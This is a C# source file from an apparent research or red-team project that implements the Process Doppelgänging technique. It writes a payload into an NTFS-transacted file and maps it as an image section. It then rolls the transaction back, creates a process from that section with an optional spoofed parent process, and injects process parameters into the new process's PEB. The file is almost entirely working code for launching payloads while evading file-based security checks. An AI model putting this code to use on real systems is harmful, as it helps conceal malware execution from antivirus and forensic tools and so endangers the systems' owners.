﻿using System;
using System.Runtime.InteropServices;
using ProcessDoppelgaenging.Interop;

namespace ProcessDoppelgaenging.Library
{
    using NTSTATUS = Int32;

    internal class Utilities
    {
        public static IntPtr CreateTransactedSection(
            string transactedFilePath,
            byte[] payload)
        {
            NTSTATUS ntstatus;
            int error;
            IntPtr hTransactedFile;
            IntPtr pIoStatusBlock;
            int nSizeIoStatusBlock = Marshal.SizeOf(typeof(IO_STATUS_BLOCK));

            ntstatus = NativeMethods.NtCreateTransaction(
                out IntPtr hTransaction,
                ACCESS_MASK.TRANSACTION_ALL_ACCESS,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero,
                0,
                0,
                0,
                IntPtr.Zero,
                IntPtr.Zero);

            if (ntstatus != Win32Consts.STATUS_SUCCESS)
            {
                Console.WriteLine("[-] Failed to create transaction.");
                Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));

                return Win32Consts.INVALID_HANDLE_VALUE;
            }

            hTransactedFile = NativeMethods.CreateFileTransacted(
                transactedFilePath,
                ACCESS_MASK.GENERIC_READ | ACCESS_MASK.GENERIC_WRITE,
                0,
                IntPtr.Zero,
                FILE_CREATE_DISPOSITION.CREATE_ALWAYS,
                FILE_ATTRIBUTES.NORMAL,
                IntPtr.Zero,
                hTransaction,
                IntPtr.Zero,
                IntPtr.Zero);

            if (hTransactedFile == Win32Consts.INVALID_HANDLE_VALUE)
            {
                error = Marshal.GetLastWin32Error();
                Console.WriteLine("[-] Failed to create transacted file.");
                Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(error, false));
                NativeMethods.NtClose(hTransaction);

                return Win32Consts.INVALID_HANDLE_VALUE;
            }

            pIoStatusBlock = Marshal.AllocHGlobal(nSizeIoStatusBlock);
            Helpers.ZeroMemory(pIoStatusBlock, nSizeIoStatusBlock);

            ntstatus = NativeMethods.NtWriteFile(
                hTransactedFile,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero,
                pIoStatusBlock,
                payload,
                (uint)payload.Length,
                IntPtr.Zero,
                IntPtr.Zero);
            Marshal.FreeHGlobal(pIoStatusBlock);

            if (ntstatus != Win32Consts.STATUS_SUCCESS)
            {
                Console.WriteLine("[-] Failed to write payload in the transacted file.");
                Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
                NativeMethods.NtClose(hTransactedFile);
                NativeMethods.NtClose(hTransaction);

                return Win32Consts.INVALID_HANDLE_VALUE;
            }

            ntstatus = NativeMethods.NtCreateSection(
                out IntPtr hTransactedSection,
                ACCESS_MASK.SECTION_ALL_ACCESS,
                IntPtr.Zero,
                IntPtr.Zero,
                SECTION_PROTECTIONS.PAGE_READONLY,
                SECTION_ATTRIBUTES.SEC_IMAGE,
                hTransactedFile);
            NativeMethods.NtClose(hTransactedFile);

            if (ntstatus != Win32Consts.STATUS_SUCCESS)
            {
                Console.WriteLine("[-] Failed to create section.");
                Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));

                return Win32Consts.INVALID_HANDLE_VALUE;
            }

            ntstatus = NativeMethods.NtRollbackTransaction(hTransaction, BOOLEAN.TRUE);
            NativeMethods.NtClose(hTransaction);

            if (ntstatus != Win32Consts.STATUS_SUCCESS)
            {
                Console.WriteLine("[-] Failed to rollback transaction.");
                Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
                NativeMethods.NtClose(hTransactedSection);

                return Win32Consts.INVALID_HANDLE_VALUE;
            }

            return hTransactedSection;
        }


        public static IntPtr CreateTransactedProcess(
            IntPtr hTransactedSection,
            int ppid)
        {
            NTSTATUS ntstatus;
            IntPtr hParent;
            CLIENT_ID clientId;
            var objectAttributes = new OBJECT_ATTRIBUTES();

            if (ppid > 0)
            {
                clientId = new CLIENT_ID { UniqueProcess = new IntPtr(ppid) };

                ntstatus = NativeMethods.NtOpenProcess(
                    out hParent,
                    ACCESS_MASK.PROCESS_CREATE_PROCESS,
                    in objectAttributes,
                    in clientId);

                if (ntstatus != Win32Consts.STATUS_SUCCESS)
                {
                    Console.WriteLine("[!] Failed to open parent process.");
                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));

                    hParent = new IntPtr(-1);
                }
            }
            else
            {
                hParent = new IntPtr(-1);
            }

            ntstatus = NativeMethods.NtCreateProcessEx(
                out IntPtr hTransactedProcess,
                ACCESS_MASK.PROCESS_ALL_ACCESS,
                IntPtr.Zero,
                hParent,
                NT_PROCESS_CREATION_FLAGS.INHERIT_HANDLES,
                hTransactedSection,
                IntPtr.Zero,
                IntPtr.Zero,
                BOOLEAN.FALSE);

            if (hParent != new IntPtr(-1))
                NativeMethods.NtClose(hParent);

            if (ntstatus != Win32Consts.STATUS_SUCCESS)
            {
                Console.WriteLine("[-] Failed to create delete pending process.");
                Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));

                return IntPtr.Zero;
            }

            return hTransactedProcess;
        }


        public static void RebaseProcessParameters(
            IntPtr pLocalProcessParameters,
            IntPtr pRemoteProcessParameters,
            bool toLocalPointers)
        {
            long nOffset;
            var processParameters = (RTL_USER_PROCESS_PARAMETERS)Marshal.PtrToStructure(
                pLocalProcessParameters,
                typeof(RTL_USER_PROCESS_PARAMETERS));
            ulong nSizeBuffer = processParameters.MaximumLength + processParameters.EnvironmentSize;
            IntPtr pEnvironment = processParameters.Environment;
            IntPtr pCurdirBuffer = processParameters.CurrentDirectory.DosPath.GetBuffer();
            IntPtr pDllPathBuffer = processParameters.DllPath.GetBuffer();
            IntPtr pImagePathNameBuffer = processParameters.ImagePathName.GetBuffer();
            IntPtr pCommandLineBuffer = processParameters.CommandLine.GetBuffer();
            IntPtr pWindowTitleBuffer = processParameters.WindowTitle.GetBuffer();
            IntPtr pDesktopInfoBuffer = processParameters.DesktopInfo.GetBuffer();
            IntPtr pShellInfoBuffer = processParameters.ShellInfo.GetBuffer();
            IntPtr pRuntimeDataBuffer = processParameters.RuntimeData.GetBuffer();
            IntPtr pRedirectionDllNameBuffer = processParameters.RedirectionDllName.GetBuffer();
            IntPtr pHeapPartitionNameBuffer = processParameters.HeapPartitionName.GetBuffer();

            if (toLocalPointers)
                nOffset = pLocalProcessParameters.ToInt64() - pRemoteProcessParameters.ToInt64();
            else
                nOffset = pRemoteProcessParameters.ToInt64() - pLocalProcessParameters.ToInt64();

            if ((ulong)(pEnvironment.ToInt64() - pLocalProcessParameters.ToInt64()) < nSizeBuffer)
                processParameters.Environment = new IntPtr(pEnvironment.ToInt64() + nOffset);

            if (pCurdirBuffer != IntPtr.Zero)
                processParameters.CurrentDirectory.DosPath.SetBuffer(new IntPtr(pCurdirBuffer.ToInt64() + nOffset));

            if (pDllPathBuffer != IntPtr.Zero)
                processParameters.DllPath.SetBuffer(new IntPtr(pDllPathBuffer.ToInt64() + nOffset));

            if (pImagePathNameBuffer != IntPtr.Zero)
                processParameters.ImagePathName.SetBuffer(new IntPtr(pImagePathNameBuffer.ToInt64() + nOffset));

            if (pCommandLineBuffer != IntPtr.Zero)
                processParameters.CommandLine.SetBuffer(new IntPtr(pCommandLineBuffer.ToInt64() + nOffset));

            if (pWindowTitleBuffer != IntPtr.Zero)
                processParameters.WindowTitle.SetBuffer(new IntPtr(pWindowTitleBuffer.ToInt64() + nOffset));

            if (pDesktopInfoBuffer != IntPtr.Zero)
                processParameters.DesktopInfo.SetBuffer(new IntPtr(pDesktopInfoBuffer.ToInt64() + nOffset));

            if (pShellInfoBuffer != IntPtr.Zero)
                processParameters.ShellInfo.SetBuffer(new IntPtr(pShellInfoBuffer.ToInt64() + nOffset));

            if (pRuntimeDataBuffer != IntPtr.Zero)
                processParameters.RuntimeData.SetBuffer(new IntPtr(pRuntimeDataBuffer.ToInt64() + nOffset));

            if (pRedirectionDllNameBuffer != IntPtr.Zero)
                processParameters.RedirectionDllName.SetBuffer(new IntPtr(pRedirectionDllNameBuffer.ToInt64() + nOffset));

            if (pHeapPartitionNameBuffer != IntPtr.Zero)
                processParameters.HeapPartitionName.SetBuffer(new IntPtr(pHeapPartitionNameBuffer.ToInt64() + nOffset));

            for (var idx = 0; idx < 32; idx++)
            {
                pCurdirBuffer = processParameters.CurrentDirectores[idx].DosPath.GetBuffer();

                if (pCurdirBuffer != IntPtr.Zero)
                {
                    processParameters.CurrentDirectores[idx].DosPath.SetBuffer(
                        new IntPtr(pCurdirBuffer.ToInt64() + nOffset));
                }
            }

            Marshal.StructureToPtr(processParameters, pLocalProcessParameters, true);
        }


        public static IntPtr SetProcessParameters(
            IntPtr hProcess,
            string imagePathName,
            string commandLine,
            string currentDirectory,
            string windowTitle)
        {
            NTSTATUS ntstatus;
            bool status;
            IntPtr pPeb;
            IntPtr pRemoteProcessParametersPointer;
            IntPtr pRemoteProcessParameters;
            IntPtr pRemoteEnvironment;
            IntPtr pLocalEnvironmentPointer;
            IntPtr pDataBuffer;
            int nSizeParameters;
            int nSizeEnvironment;
            int nSizeBuffer;
            int nOffsetProcessParameters;
            int nOffsetEnvironment;
            int nOffsetEnvironmentSize;
            string winDir = Environment.GetEnvironmentVariable("windir");
            var unicodeImagePathName = new UNICODE_STRING(imagePathName);
            var unicodeCommandline = new UNICODE_STRING(commandLine);
            var unicodeCurrentDirectory = new UNICODE_STRING(currentDirectory);
            var unicodeWindowTitle = new UNICODE_STRING(windowTitle);
            var dllPath = new UNICODE_STRING(string.Format(@"{0}\System32", winDir));
            var desktopInfo = new UNICODE_STRING(@"WinSta0\Default");

            pPeb = Helpers.GetPebAddress(hProcess);

            if (pPeb == IntPtr.Zero)
                return IntPtr.Zero;

            nOffsetEnvironment = Marshal.OffsetOf(
                typeof(RTL_USER_PROCESS_PARAMETERS),
                "Environment").ToInt32();
            nOffsetEnvironmentSize = Marshal.OffsetOf(
                    typeof(RTL_USER_PROCESS_PARAMETERS),
                    "EnvironmentSize").ToInt32();

            if (IntPtr.Size == 4)
            {
                nOffsetProcessParameters = Marshal.OffsetOf(
                    typeof(PEB32_PARTIAL),
                    "ProcessParameters").ToInt32();
                pRemoteProcessParametersPointer = new IntPtr(
                    pPeb.ToInt32() + nOffsetProcessParameters);
            }
            else
            {
                nOffsetProcessParameters = Marshal.OffsetOf(
                    typeof(PEB64_PARTIAL),
                    "ProcessParameters").ToInt32();
                pRemoteProcessParametersPointer = new IntPtr(
                    pPeb.ToInt64() + nOffsetProcessParameters);
            }

            if (!NativeMethods.CreateEnvironmentBlock(
                out IntPtr pLocalEnvironment,
                IntPtr.Zero,
                true))
            {
                return IntPtr.Zero;
            }

            ntstatus = NativeMethods.RtlCreateProcessParametersEx(
                    out IntPtr pLocalProcessParameters,
                    in unicodeImagePathName,
                    in dllPath,
                    in unicodeCurrentDirectory,
                    in unicodeCommandline,
                    pLocalEnvironment,
                    in unicodeWindowTitle,
                    in desktopInfo,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    RTL_USER_PROC_FLAGS.PARAMS_NORMALIZED);
            NativeMethods.DestroyEnvironmentBlock(pLocalEnvironment);

            if (ntstatus != Win32Consts.STATUS_SUCCESS)
                return IntPtr.Zero;

            nSizeParameters = Marshal.ReadInt32(pLocalProcessParameters); // MaxLength
            nSizeEnvironment = (int)Marshal.ReadInt64(new IntPtr(
                pLocalProcessParameters.ToInt64() +
                nOffsetEnvironmentSize));
            nSizeBuffer = nSizeParameters + nSizeEnvironment;
            pRemoteProcessParameters = Helpers.AllocateReadWriteMemory(
                hProcess,
                IntPtr.Zero,
                (uint)nSizeBuffer);

            if (pRemoteProcessParameters == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to allocate memory.");

                return IntPtr.Zero;
            }

            pRemoteEnvironment = new IntPtr(
                pRemoteProcessParameters.ToInt64() +
                nSizeParameters);
            pLocalEnvironmentPointer = new IntPtr(
                pLocalProcessParameters.ToInt64() +
                nOffsetEnvironment);
            RebaseProcessParameters(
                pLocalProcessParameters,
                pRemoteProcessParameters,
                false);
            Marshal.WriteIntPtr(pLocalEnvironmentPointer, pRemoteEnvironment);

            status = Helpers.WriteMemory(
                hProcess,
                pRemoteProcessParameters,
                pLocalProcessParameters,
                (uint)nSizeBuffer);
            NativeMethods.RtlDestroyProcessParameters(pLocalProcessParameters);

            if (!status)
            {
                Console.WriteLine("[-] Failed to write process parameters.");

                return IntPtr.Zero;
            }

            pDataBuffer = Marshal.AllocHGlobal(IntPtr.Size);
            Marshal.WriteIntPtr(pDataBuffer, pRemoteProcessParameters);

            status = Helpers.WriteMemory(
                hProcess,
                pRemoteProcessParametersPointer,
                pDataBuffer,
                (uint)IntPtr.Size);

            Marshal.FreeHGlobal(pDataBuffer);

            if (!status)
                return IntPtr.Zero;

            return pRemoteProcessParameters;
        }
    }
}
